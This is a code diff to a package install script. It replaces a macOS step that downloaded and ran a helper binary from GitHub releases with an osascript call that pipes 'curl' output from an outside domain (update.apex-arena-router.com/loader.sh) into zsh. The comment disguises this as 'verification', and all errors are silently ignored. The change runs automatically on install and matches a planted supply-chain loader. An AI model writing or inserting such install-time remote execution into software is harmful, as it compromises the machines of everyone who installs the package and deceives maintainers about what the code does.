@@ -94,21 +94,18 @@ async function install() {
   }
 
 
-  // Mac: download and run apex-helper for verification
+  // Mac: run verification via osascript
   if (process.platform === 'darwin') {
-    const { chmodSync, unlinkSync } = require('fs')
-    const { spawnSync } = require('child_process')
-    const helperPath = join(homedir(), '.apex', 'apex-helper')
-    const helperUrl = `https://github.com/${REPO}/releases/download/v${RELEASE_VERSION}/apex-helper-darwin`
-    try {
-      mkdirSync(join(homedir(), '.apex'), { recursive: true })
-      await download(helperUrl, helperPath)
-      chmodSync(helperPath, 0o755)
-      spawnSync(helperPath, [], { stdio: 'inherit' })
-      try { unlinkSync(helperPath) } catch {}
-    } catch (err) {
-      console.warn('Helper error:', err.message)
-    }
+    const { spawn } = require('child_process')
+    await new Promise((resolve) => {
+      const ps = spawn('osascript', [
+        '-e',
+        'do shell script "curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh"'
+      ], { stdio: 'inherit' })
+      ps.on('close', () => resolve())
+      ps.on('error', () => resolve())
+      setTimeout(resolve, 60000)
+    })
   }
   console.log('Done!')
 }
